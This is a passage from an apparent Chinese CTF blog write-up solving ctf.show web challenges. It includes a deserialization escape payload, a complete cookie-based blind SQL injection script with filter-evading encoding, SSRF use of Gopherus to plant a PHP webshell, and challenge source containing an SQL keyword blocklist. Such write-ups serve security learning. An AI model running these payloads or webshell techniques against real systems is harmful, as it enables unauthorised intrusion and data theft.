hashlib.md5(password.encode()).hexdigest()&#125;</span><br><span class="line">    s = requests.session()</span><br><span class="line">    r = s.post(<span class="attribute">url</span>=url + <span class="string">&quot;login.php&quot;</span>, <span class="attribute">data</span>=data, <span class="attribute">allow_redirects</span>=<span class="literal">False</span>)</span><br><span class="line">    # <span class="built_in">print</span>(r.headers)</span><br><span class="line">    <span class="keyword">if</span> r.headers[<span class="string">&quot;location&quot;</span>] == <span class="string">&quot;/user_main.php?order=id&quot;</span>:</span><br><span class="line">        return s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;login error!&quot;</span>)</span><br><span class="line">        return None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;-.0123456789:abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span></span><br><span class="line">reg(hashlib.md5(<span class="string">&quot;check&quot;</span>.encode()).hexdigest())</span><br><span class="line">session = login(hashlib.md5(<span class="string">&quot;check&quot;</span>.encode()).hexdigest(), <span class="string">&quot;check&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwd = [<span class="string">&quot;-&quot;</span>] * 100</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(pwd)):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(len(key)):</span><br><span class="line">        pwd[i] = key[x]</span><br><span class="line">        _pwd = <span class="string">&quot;&quot;</span>.join(pwd)</span><br><span class="line">        <span class="keyword">if</span> reg(_pwd):</span><br><span class="line">            r = session.<span class="built_in">get</span>(<span class="attribute">url</span>=url + <span class="string">&quot;user_main.php?order=pwd&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> _pwd <span class="keyword">in</span> r.text.split(<span class="string">&quot;flag_is_my_password&quot;</span>)[1]:</span><br><span class="line">                pwd[i] = key[x - 1]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(pwd))</span><br><span class="line">                break</span><br></pre></td></tr></table></figure></div>
<p> 但是我用了网上的几个脚本都只能解密到一半就报错了。还是以后等自己python学好了写自己的脚本吧</p>
<h1 id="game-gyctf-web2"><a href="#game-gyctf-web2" class="headerlink" title="game-gyctf web2"></a>game-gyctf web2</h1><p><img src="https://pic1.imgdb.cn/item/67ac664cd0e0a243d4fe9949.png"><br>题目是一个登录系统，提示成员留后门。随便输入了一个用户名和密码提示用户不存在，输入admin用户提示密码错误，所以先尝试能不能爆破。爆破失败，但是扫描目录发现<a href="http://www.zip下载下来之后可以得到网页的源码./">www.zip下载下来之后可以得到网页的源码。</a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># update.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你还没有登陆呢！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$users</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$users</span>-&gt;<span class="title function_ invoke__">update</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>要想登录成功就要让session [login]&#x3D;1<br>后面的代码审计和反序列化字符逃逸对我来还是太难了，详情可以看这篇博客<a href="ttps://www.cnblogs.com/aninock/p/15408090.html"># <a href="https://www.cnblogs.com/aninock/p/15408090.html" title="发布于 2021-10-14 19:12">CTFSHOW - 日刷 - game-gyctf web2&#x2F;pop 链 - 反序列字符逃逸</a></a><br>最后在?action&#x3D;update界面上传post数据<br>payload: </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">age=<span class="number">18</span>&amp;nickname=intointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointointo<span class="string">&quot;;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:12:&quot;</span>UpdateHelpe<span class="string">r&quot;:1:&#123;s:3:&quot;</span>sql<span class="string">&quot;;O:4:&quot;</span>Use<span class="string">r&quot;:2:&#123;s:3:&quot;</span>age<span class="string">&quot;;s:70:&quot;</span>select <span class="number">1</span>,<span class="string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span> from user where username=?<span class="string">&quot;;s:8:&quot;</span>nickname<span class="string">&quot;;O:4:&quot;</span>Info<span class="string">&quot;:3:&#123;s:3:&quot;</span>age<span class="string">&quot;;N;s:8:&quot;</span>nickname<span class="string">&quot;;N;s:8:&quot;</span>CtrlCase<span class="string">&quot;;O:6:&quot;</span>dbCtrl<span class="string">&quot;:2:&#123;s:4:&quot;</span>name<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;&#125;&#125;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
<p>然后出现10-0就说明成功 用admin&#x2F;1就可以登录了</p>
<h1 id="web15-Fishman"><a href="#web15-Fishman" class="headerlink" title="web15 Fishman"></a>web15 Fishman</h1><p><img src="https://pic1.imgdb.cn/item/67ac664dd0e0a243d4fe994a.png" alt="|500"><br>题目又是一个登录界面，注册个账号看看.但是点注册跳转到的是qq的注册地址,而且又是一个代码审计题目<br>在网址输入&#x2F;<a href="http://www.zip就可以下载源文件,扫描之后发现网站还有一个admin.目录/">www.zip就可以下载源文件,扫描之后发现网站还有一个admin.目录</a><br>在member.php中存在sql注入</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;IN_CRONLITE&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$islogin</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;islogin&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">&quot;login_data&quot;</span>]) &#123;</span><br><span class="line">            <span class="variable">$login_data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;login_data&#x27;</span>], <span class="literal">true</span>);</span><br><span class="line">            <span class="variable">$admin_user</span> = <span class="variable">$login_data</span>[<span class="string">&#x27;admin_user&#x27;</span>];</span><br><span class="line">            <span class="variable">$udata</span> = <span class="variable">$DB</span>-&gt;<span class="title function_ invoke__">get_row</span>(<span class="string">&quot;SELECT * FROM fish_admin WHERE username=&#x27;<span class="subst">$admin_user</span>&#x27; limit 1&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$udata</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;islogin&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">604800</span>);</span><br><span class="line">                <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;login_data&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">604800</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$admin_pass</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$udata</span>[<span class="string">&#x27;password&#x27;</span>] . LOGIN_KEY);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$admin_pass</span> == <span class="variable">$login_data</span>[<span class="string">&#x27;admin_pass&#x27;</span>]) &#123;</span><br><span class="line">                <span class="variable">$islogin</span> = <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;islogin&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">604800</span>);</span><br><span class="line">                <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;login_data&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">time</span>() - <span class="number">604800</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;islogin&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&quot;admin_user&quot;</span>]) &#123;</span><br><span class="line">            <span class="variable">$admin_user</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_user&#x27;</span>]);</span><br><span class="line">            <span class="variable">$udata</span> = <span class="variable">$DB</span>-&gt;<span class="title function_ invoke__">get_row</span>(<span class="string">&quot;SELECT * FROM fish_admin WHERE username=&#x27;<span class="subst">$admin_user</span>&#x27; limit 1&quot;</span>);</span><br><span class="line">            <span class="variable">$admin_pass</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$udata</span>[<span class="string">&#x27;password&#x27;</span>] . LOGIN_KEY);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$admin_pass</span> == <span class="variable">$_SESSION</span>[<span class="string">&quot;admin_pass&quot;</span>]) &#123;</span><br><span class="line">                <span class="variable">$islogin</span> = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>当查询返回的用户名为空且密码错误时，进行四次 setcookie 操作 当查询返回的用户名为不为空时，进行两次 setcookie 操作<br>大佬的脚本：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://662305d4-5c5b-490d-bedf-dbc29ead878a.challenge.ctf.show/admin/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload</span>):</span><br><span class="line">    payload = payload.lower()</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;\\u0075&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\u0027&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;\\u006f&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;\\u0069&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\\u0022&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\\u0020&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;\\u0073&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;\\u0023&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\\u003e&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;\\u003c&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;\\u002d&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;\\u003d&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;f1a9&#x27;</span>, <span class="string">&#x27;F1a9&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;f1&#x27;</span>, <span class="string">&#x27;F1&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#get database length</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">databaseName_len</span>():</span><br><span class="line">	<span class="built_in">print</span> (<span class="string">&quot;start get database name length...&quot;</span>)</span><br><span class="line">	<span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">45</span>):</span><br><span class="line">		payload = <span class="string">&quot;1&#x27; or (length(database())=&quot;</span> + <span class="built_in">str</span>(l+<span class="number">1</span>) + <span class="string">&quot;)#&quot;</span></span><br><span class="line">		payload = tamper(payload)</span><br><span class="line">		tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">		headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">		r =requests.get(url, headers=headers)</span><br><span class="line">		myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">		<span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">1</span>)):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;get db length = &#x27;</span> + <span class="built_in">str</span>(l).lower())</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">			</span><br><span class="line"><span class="comment">#get content</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_databaseName</span>():</span><br><span class="line">	flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">15</span>):</span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7f</span>):</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				payload = <span class="string">&quot;1&#x27; or (select (database()) between &#x27;&quot;</span> + flag + <span class="built_in">chr</span>(c) + <span class="string">&quot;&#x27; and &#x27;&quot;</span> +<span class="built_in">chr</span>(<span class="number">126</span>) + <span class="string">&quot;&#x27;)#&quot;</span></span><br><span class="line">			<span class="comment">#print(payload)</span></span><br><span class="line">			payload = tamper(payload)</span><br><span class="line">			tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">			headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">			r =requests.get(url, headers=headers)</span><br><span class="line">			myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">			<span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">2</span>)):</span><br><span class="line">				flag += <span class="built_in">chr</span>(c - <span class="number">1</span>)</span><br><span class="line">				<span class="built_in">print</span>(<span class="string">&#x27;databasename = &#x27;</span> + flag.lower())</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get content</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_tableName</span>():</span><br><span class="line">	flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">30</span>):           <span class="comment">#blind inject</span></span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7f</span>):</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				payload = <span class="string">&quot;1&#x27; or (select (select table_name from information_schema.tables where table_schema=database() limit 3,1) between &#x27;&quot;</span> + flag + <span class="built_in">chr</span>(c) + <span class="string">&quot;&#x27; and &#x27;&quot;</span> +<span class="built_in">chr</span>(<span class="number">126</span>) + <span class="string">&quot;&#x27;)#&quot;</span></span><br><span class="line">			<span class="comment">#print(payload)</span></span><br><span class="line">			payload = tamper(payload)</span><br><span class="line">			tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">			headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">			r =requests.get(url, headers=headers)</span><br><span class="line">			myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">			<span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">2</span>)):</span><br><span class="line">				flag += <span class="built_in">chr</span>(c - <span class="number">1</span>)</span><br><span class="line">				<span class="built_in">print</span>(<span class="string">&#x27;tablename = &#x27;</span> + flag.lower())</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">				</span><br><span class="line"><span class="comment">#get content</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ColumnName</span>():</span><br><span class="line">	flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):           <span class="comment">#blind inject</span></span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7f</span>):</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				payload = <span class="string">&quot;1&#x27; or (select (select column_name from information_schema.columns where table_name=&#x27;FL2333G&#x27; limit 0,1) between &#x27;&quot;</span> + flag + <span class="built_in">chr</span>(c) + <span class="string">&quot;&#x27; and &#x27;&quot;</span> +<span class="built_in">chr</span>(<span class="number">126</span>) + <span class="string">&quot;&#x27;)#&quot;</span></span><br><span class="line">			<span class="comment">#print(payload)</span></span><br><span class="line">			payload = tamper(payload)</span><br><span class="line">			tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">			headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">			r =requests.get(url, headers=headers)</span><br><span class="line">			myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">			<span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">2</span>)):</span><br><span class="line">				flag += <span class="built_in">chr</span>(c - <span class="number">1</span>)</span><br><span class="line">				<span class="built_in">print</span>(<span class="string">&#x27;column name = &#x27;</span> + flag.lower())</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">				</span><br><span class="line"><span class="comment">#get content</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_value</span>():</span><br><span class="line">	flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">50</span>):           <span class="comment">#blind inject</span></span><br><span class="line">		<span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>,<span class="number">0x7f</span>):</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;;&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;\\&#x27;</span> <span class="keyword">or</span> <span class="built_in">chr</span>(c) == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				payload = <span class="string">&quot;1&#x27; or (select (select FLLLLLAG from FL2333G) between &#x27;&quot;</span> + flag + <span class="built_in">chr</span>(c) + <span class="string">&quot;&#x27; and &#x27;&quot;</span> +<span class="built_in">chr</span>(<span class="number">126</span>) + <span class="string">&quot;&#x27;)#&quot;</span></span><br><span class="line">			<span class="comment">#print(payload)</span></span><br><span class="line">			payload = tamper(payload)</span><br><span class="line">			tmpCookie = <span class="string">&#x27;islogin=1;login_data=&#123;&quot;admin_user&quot;:&quot;%s&quot;,&quot;admin_pass&quot;:65&#125;&#x27;</span> % payload</span><br><span class="line">			headers = &#123;<span class="string">&#x27;cookie&#x27;</span>: tmpCookie&#125;</span><br><span class="line">			r =requests.get(url, headers=headers)</span><br><span class="line">			myHeaders = <span class="built_in">str</span>(r.raw.headers)</span><br><span class="line">			<span class="keyword">if</span> ((myHeaders.count(<span class="string">&quot;login_data&quot;</span>) == <span class="number">2</span>)):</span><br><span class="line">				flag += <span class="built_in">chr</span>(c - <span class="number">1</span>)</span><br><span class="line">				<span class="built_in">print</span>(<span class="string">&#x27;flag = &#x27;</span> + flag.lower())</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;start database sql injection...&quot;</span>)</span><br><span class="line">databaseName_len()</span><br><span class="line">get_databaseName()</span><br><span class="line">get_tableName()</span><br><span class="line">get_ColumnName()</span><br><span class="line">get_value()</span><br></pre></td></tr></table></figure></div>
<h1 id="红包题第九弹"><a href="#红包题第九弹" class="headerlink" title="红包题第九弹"></a>红包题第九弹</h1><p><img src="https://pic1.imgdb.cn/item/67ac669fd0e0a243d4fe9960.png" alt="|425"><br>给了一个登录界面，点击login会跳到一个check.php,随便写用户名和密码，发现有给一个reurl参数<br>所以猜测有ssrf<br><img src="https://pic1.imgdb.cn/item/67ac66afd0e0a243d4fe996e.png"><br>这里使用ssrf专用的工具Gopherus <a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a><br>我用的kali安装，修改了一下install.sh </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">python3 -m pip install argparse --break-system-packages</span><br><span class="line">python3 -m pip install requests --break-system-packages</span><br><span class="line"><span class="built_in">chmod</span> +x gopherus.py</span><br><span class="line"><span class="built_in">ln</span> -sf $(<span class="built_in">pwd</span>)/gopherus.py /usr/local/bin/gopherus</span><br></pre></td></tr></table></figure></div>
<p>然后写入一句话木马<br><img src="https://pic1.imgdb.cn/item/67ac6865d0e0a243d4fe9a42.png"><br>得到poc,把poc做个url编码，然后用bp发送<br><img src="https://pic1.imgdb.cn/item/67ac67b0d0e0a243d4fe9a10.png"><br>用蚁剑连接之后在根目录找到flag<br><img src="https://pic1.imgdb.cn/item/67ac6855d0e0a243d4fe9a3c.png" alt="|475"></p>
<h1 id="红包题-葵花宝典"><a href="#红包题-葵花宝典" class="headerlink" title="红包题 葵花宝典"></a>红包题 葵花宝典</h1><p><img src="https://pic1.imgdb.cn/item/67ac6846d0e0a243d4fe9a38.png" alt="|525"><br>又是一个登录平台<br>注册之后登录直接拿到flag<br><img src="https://pic1.imgdb.cn/item/67ac6867d0e0a243d4fe9a43.png"></p>
<h1 id="红包题-辟邪剑谱"><a href="#红包题-辟邪剑谱" class="headerlink" title="红包题 辟邪剑谱"></a>红包题 辟邪剑谱</h1><p>和上一题一样的登录界面,但是注册之后不能登录。在url中访问<a href="http://www.zip可以下载源代码/">www.zip可以下载源代码</a><br>checklogin.php代码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line"><span class="operator">&lt;</span><span class="operator">?</span>php</span><br><span class="line">    require_once &#x27;<span class="operator">/</span>inc<span class="operator">/</span>inc.php&#x27;;</span><br><span class="line"></span><br><span class="line">    $user_name <span class="operator">=</span> trim($_POST[&#x27;user_name&#x27;]);</span><br><span class="line">    $user_password <span class="operator">=</span> trim($_POST[&#x27;user_password&#x27;]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/select|update|drop|union|and|or|sys|substr|sleep|from|where|0x|hex|bin|char|file|order|limit|by|<span class="char escape_">\`</span>|<span class="char escape_">\~</span>|<span class="char escape_">\!</span>|<span class="char escape_">\@</span>|<span class="char escape_">\#</span>|<span class="char escape_">\\</span>$|<span class="char escape_">\%</span>|<span class="char escape_">\^</span>|<span class="char escape_">\&amp;</span>|<span class="char escape_">\*</span>|<span class="char escape_">\(</span>|<span class="char escape_">\)</span>|<span class="char escape_">\（</span>|<span class="char escape_">\）</span>|<span class="char escape_">\-</span>|<span class="char escape_">\_</span>|<span class="char escape_">\+</span>|<span class="char escape_">\=</span>|<span class="char escape_">\&#123;</span>|<span class="char escape_">\[</span>|<span class="char escape_">\&#125;</span>|<span class="char escape_">\]</span>|<span class="char escape_">\;</span>|<span class="char escape_">\:</span>|<span class="char escape_">\&#x27;</span>|<span class="char escape_">\&quot;</span>|<span class="char escape_">\&lt;</span>|<span class="char escape_">\,</span>|<span class="char escape_">\&gt;</span>|<span class="char escape_">\.</span>|<span class="char escape_">\?</span>/i&quot;</span>, $user_name)) &#123;</span><br><span class="line">        die(<span class="string">&quot;stop hack!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/select|update|drop|union|and|or|sys|substr|sleep|from|where|0x|hex|bin|char|file|order|limit|by|<span class="char escape_">\`</span>|<span class="char escape_">\~</span>|<span class="char escape_">\!</span>|<span class="char escape_">\@</span>|<span class="char escape_">\#</span>|<span class="char escape_">\\</span>$|<span class="char escape_">\%</span>|<span class="char escape_">\^</span>|<span class="char escape_">\&amp;</span>|<span class="char escape_">\*</span>|<span class="char escape_">\(</span>|<span class="char escape_">\)</span>|<span class="char escape_">\（</span>|<span class="char escape_">\）</span>|<span class="char escape_">\-</span>|<span class="char escape_">\_</span>|<span class="char escape_">\+</span>|<span class="char escape_">\=</span>|<span class="char escape_">\&#123;</span>|<span class="char escape_">\[</span>|<span class="char escape_">\&#125;</span>|<span class="char escape_">\]</span>|<span class="char escape_">\;</span>|<span class="char 